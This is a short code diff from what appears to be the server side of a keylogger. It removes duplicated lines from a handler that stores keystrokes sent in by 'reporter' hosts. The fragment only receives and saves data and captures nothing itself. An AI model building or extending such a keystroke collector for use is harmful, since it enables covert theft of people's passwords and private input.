@@ -82,12 +82,6 @@ def keylog_handler(host):
     :param host: ip of reporter
     :return: "invalid" if failed, "success" if successful
     """
-    print("1")
-    data = request.data
-    print("2")
-    db.add_keystroke(host, data)
-    print("3")
-    return "success"
     try:
         print("1")
         data = request.data
